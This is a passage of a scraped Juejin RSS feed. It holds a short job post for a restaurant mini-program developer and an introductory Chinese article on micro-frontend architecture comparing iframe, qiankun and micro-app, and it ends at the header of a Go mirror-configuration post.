<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2eb2a0eee4043a7a51fa722c599e41f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478211&amp;x-signature=cpq%2F6sudUWnXpdDD2vyi%2BviQAdw%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-5">现场精彩瞬间</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d56f5faa1f34b0e9d1529cf3be10ea5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478211&amp;x-signature=MeFHJJi4AkUNbWlmrVhW6UHP7K4%3D" alt="图片" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[餐饮小程序需要你们]]></title>    <link>https://juejin.cn/post/7584307642983907369</link>    <guid>https://juejin.cn/post/7584307642983907369</guid>    <pubDate>2025-12-16T08:26:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584307642983907369" data-draft-id="7584057497206456363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="餐饮小程序需要你们"/> <meta itemprop="keywords" content="前端,后端,Java"/> <meta itemprop="datePublished" content="2025-12-16T08:26:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端小张同学"/> <meta itemprop="url" content="https://juejin.cn/user/1922381414934589"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            餐饮小程序需要你们
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1922381414934589/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端小张同学
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:26:33.000Z" title="Tue Dec 16 2025 08:26:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是前端小张同学，最近公司要搞一个餐饮小程序，需要一名全栈工程师和我一起开发，需要一名兼职人员和我一起完成这个业务，有意者私信我。</p>
<p>技术栈：前端 vue3 vite</p>
<p>服务端 java redis mybatis-plus mysql</p>
<p>核心功能微信支付 商城 ，点餐，以及后台系统管理。</p>
<p>有意者私聊</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69713f619a8a456f8f15293a4b6e48a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5bCP5byg5ZCM5a2m:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478392&amp;x-signature=%2FC5w3wUhraOJLFx3phwwYHdpLT4%3D" alt="image.png" loading="lazy"/></p>
<p>今天文章就分享到这，感谢大家！！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[微前端架构（一）：基础入门]]></title>    <link>https://juejin.cn/post/7584057497206571051</link>    <guid>https://juejin.cn/post/7584057497206571051</guid>    <pubDate>2025-12-16T08:29:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497206571051" data-draft-id="7584057497206505515" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="微前端架构（一）：基础入门"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-16T08:29:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码农胖大海"/> <meta itemprop="url" content="https://juejin.cn/user/4195392102086967"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            微前端架构（一）：基础入门
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4195392102086967/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码农胖大海
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:29:14.000Z" title="Tue Dec 16 2025 08:29:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前言</h2>
<p>很荣幸由我主导设计并实现了公司自研的微前端框架，目前该框架已在多个业务项目中广泛应用。本文是我结合内部培训、产品文档及相关实践梳理而成的总结，旨在对微前端技术体系进行系统性的整理与沉淀。</p>
<p>作为系列文章的第一篇，本文将从基础概念与核心知识入手，带大家迈入微前端的大门。</p>
<p>我们将围绕以下三个核心问题展开：</p>
<ol>
<li>微前端是什么？</li>
<li>它能解决什么实际问题？</li>
<li>主流的实现方案有哪些？</li>
</ol>
<h2 data-id="heading-1">二、什么是微前端</h2>
<p>微前端（Micro Frontends）是一种借鉴微服务（分而治之）理念的前端架构模式。它将单体前端应用拆分为多个独立自治的小型子应用。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26488dad324d4479a376b91f387f7fa3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5Yac6IOW5aSn5rW3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478554&amp;x-signature=IBXZ3X7F6E%2BJXMhyCoOb9UwIm0Y%3D" alt="image.png" loading="lazy"/></p>
<p>它具备以下核心特征：</p>
<ol>
<li>
<p>技术栈无关性</p>
<ul>
<li>子应用可使用不同框架（如React、Vue、Angular甚至原生JS），主框架不限制技术选型。</li>
</ul>
</li>
<li>
<p>独立开发与部署</p>
<ul>
<li>应用拆分后，团队可并行开发、测试和部署子应用，无需协调整体发布流程。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-2">三、为什么要微前端</h2>
<p>一句话概括就是，它能够解决巨型、复杂单体应用存在的一系列问题：</p>
<ol>
<li>
<p>维护困难</p>
<ul>
<li>单体应用随业务膨胀导致代码量激增，开发效率低下、升级风险高。微前端通过物理拆分降低复杂度。</li>
</ul>
</li>
<li>
<p>技术栈迭代阻力</p>
<ul>
<li>旧系统无法直接升级框架（如Vue2→Vue3），微前端允许渐进式重构，新旧模块共存。</li>
</ul>
</li>
<li>
<p>团队协作效率低</p>
<ul>
<li>多团队在单一仓库协作易引发冲突。微前端实现团队自治，各团队负责独立子应用。</li>
</ul>
</li>
<li>
<p>部署耦合性高</p>
<ul>
<li>单体应用需全量部署，微前端支持独立发布，更新子应用无需全局回归测试。</li>
</ul>
</li>
</ol>
<p>需要明确的是，微前端解决的是组织和团队间协作带来的<strong>工程问题</strong>，而不是单纯的某个<strong>技术问题</strong>。</p>
<h2 data-id="heading-3">四、微前端的适用场景</h2>
<p>当一个项目面临上述挑战时，便是考虑采用微前端架构的恰当时机。典型的适用场景包括：</p>
<ol>
<li>
<p>多团队协作的巨型应用</p>
<ul>
<li>需要支持多团队、多厂商、多业务板块应用的发布上线，比如采集2.0。</li>
</ul>
</li>
<li>
<p>遗留系统改造</p>
<ul>
<li>比如某个老系统在技术翻新，但同时又存在持续新增的需求。我们不可能等新系统全部开发好再去替代旧系统。</li>
<li>微前端可以让新增或改造好的功能和原有功能能够同时运行，渐进式地完成重构替换。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-4">五、微前端的副作用</h2>
<p>任何技术架构都是一枚硬币的两面，微前端也不例外。它并非银弹，在赋予系统灵活性与独立性的同时，也必然引入新的复杂性与挑战。典型的问题有：</p>
<ol>
<li>
<p>性能损耗</p>
<ul>
<li>页面加载速度慢：子应用静态资源的获取，以及解析运行子应用脚本有额外的开销。</li>
<li>内存占用高：子应用的缓存、CSS/JS隔离机制，都会带来额外的内存占用。</li>
</ul>
</li>
<li>
<p>开发与运维复杂度</p>
<ul>
<li>调试成本增加：由于主应用与微应用的分层架构，跨应用链路调试难度显著上升。</li>
<li>版本兼容性管理复杂：例如，采集2.0基座在不同网省环境中存在版本差异，业务微应用在各地上线时就面临版本兼容性挑战，需要多版本适配。</li>
</ul>
</li>
<li>
<p>设计体验割裂风险</p>
<ul>
<li>微前端支持子应用的独立演进，但若缺乏统一的设计规约，极易导致不同模块间的视觉风格与交互逻辑不一致，从而造成用户体验的割裂。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-5">六、常见的微前端方案</h2>
<h3 data-id="heading-6">6.1 iframe方案</h3>
<p>iframe 凭借其原生的硬隔离特性，被认为是实现微前端隔离最简单粗暴的方案——样式、JS 互不干扰。但它确实存在许多难以克服的局限性。</p>
<p>其中最典型的问题有：</p>
<ol>
<li>
<p>URL 不同步，路由状态丢失</p>
<ul>
<li>子应用url的切换基于iframe的src，它不会不体现在浏览器地址栏，后退前进按钮无法使用</li>
<li>浏览器刷新 iframe url 状态丢失</li>
</ul>
</li>
<li>
<p>UI 不同步，DOM 结构不共享，弹窗都弹不到中间</p>
<ul>
<li>想象一个场景：一个仅占屏幕1/4的 iframe，想要弹出一个全屏遮罩层并居中的对话框。由于 DOM 隔离，这个弹框会被死死限制在 iframe 的边框内，根本无法实现全局居中。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">6.2 qiankun方案</h3>
<p>qiankun 是由蚂蚁金服孵化的一个微前端实现库。它基于 single-spa 扩展，提供了微前端所需的核心能力：应用加载、应用隔离、应用通信等。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e708a9bb04e4e928b8a82fc988999b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5Yac6IOW5aSn5rW3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478554&amp;x-signature=rWZ6m%2FjCfpYcvpSpyxZynbDHjHE%3D" alt="image.png" loading="lazy"/></p>
<p>它的核心优势在于</p>
<ol>
<li>享有先发优势，社区活跃，文档完善</li>
<li>历经了大量企业级项目的锤炼，在易用性、功能完备性、可靠性之间有着绝佳的平衡</li>
</ol>
<h3 data-id="heading-8">6.3 micro-app方案</h3>
<p>micro-app是由京东前端团队推出的一款微前端框架，它借鉴了WebComponent的思想，通过js沙箱、样式隔离、元素隔离、路由隔离模拟实现了ShadowDom的隔离特性，并结合CustomElement将微前端封装成一个类WebComponent组件，从而实现微前端的组件化渲染。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbac3795cae8443a99c4c61bc29de3d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5Yac6IOW5aSn5rW3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766478554&amp;x-signature=C6RHCkUE033tXSpI7TWw6NavRpI%3D" alt="image.png" loading="lazy"/></p>
<p>它的核心优势在于</p>
<ol>
<li>高效的隔离实现：借鉴WebComponent的应用隔离方案，更贴近原生，在资源加载和处理效率更高</li>
<li>极简的接入体验：一行代码即可渲染一个微前端应用。</li>
</ol>
<h2 data-id="heading-9">七、学习资料</h2>
<h3 data-id="heading-10">7.1 学习路径</h3>
<ol>
<li>
<p>了解微前端的背景知识</p>
<ul>
<li>知道微前端是什么，能够解决什么问题。</li>
</ul>
</li>
<li>
<p>通读官方文档</p>
<ul>
<li>通过文档对微前端框架建立初步系统的认识。</li>
</ul>
</li>
<li>
<p>试用微前端框架</p>
<ul>
<li>结合Demo实践API，通过“理解、尝试、验证、再理解”的循环过程，不断加深对技术的掌握。</li>
</ul>
</li>
<li>
<p>深入原理</p>
<ul>
<li>借助社区文章和开源代码，吃透应用隔离、应用通信等核心机制的实现原理。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-11">7.2 相关资料</h3>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fqiankun.umijs.org%2Fzh%2Fguide" target="_blank" title="https://qiankun.umijs.org/zh/guide" ref="nofollow noopener noreferrer">qiankun官网</a></p>
<ul>
<li>常见问题（必读）</li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.yuque.com%2Fkuitos%2Fgky7yw" target="_blank" title="https://www.yuque.com/kuitos/gky7yw" ref="nofollow noopener noreferrer">qiankun技术圆桌</a></p>
<ul>
<li>qiankun开发团队的微前端系列精华文章</li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgongshun%2Fqiankun-vue-demo" target="_blank" title="https://github.com/gongshun/qiankun-vue-demo" ref="nofollow noopener noreferrer">qiankun-vue-demo</a></p>
<ul>
<li>用<code>qiankun</code>来实现<code>vue</code>技术栈的前端微服务</li>
</ul>
</li>
<li>
<p><a href="https://juejin.cn/collection/6873383212496715783" target="_blank" title="https://juejin.cn/collection/6873383212496715783">掘金社区文章</a></p>
<ul>
<li>个人在学习过程中收录的高质量文章</li>
</ul>
</li>
</ul>
<h2 data-id="heading-12">八、总结与寄语</h2>
<p>微前端是将单体前端应用拆分为独立子应用的架构模式，具备技术栈无关、独立开发部署等特性，旨在解决巨型应用维护困难、技术栈迭代和团队协作效率低等问题。但它也带来性能损耗和运维复杂度等挑战。常见方案包括iframe、qiankun和micro-app。</p>
<p>微前端底层机制复杂，但其实现库的学习成本很低。以qiankun为例，其API总共才9个，我们结合官方文档与示例项目很快就能入门上手。希望感兴趣的同学积极尝试与应用，让我们互相学习、共同努力、变得更强，加油！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Go 安装插件更换国内镜像]]></title>    <link>https://juejin.cn/post/7584094504631779337</link>    <guid>https://juejin.cn/post/7584094504631779337</guid>    <pubDate>2025-12-16T08:03:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584094504631779337" data-draft-id="7584203412197179418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Go 安装插件更换国内镜像"/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2025-12-16T08:03:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="卡尔特斯"/> <meta itemprop="url" content="https://juejin.cn/user/4450440831840909"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Go 安装插件更换国内镜像
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4450440831840909/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    卡尔特斯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:03:38.000Z" title="Tue Dec 16 2025 08:03:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
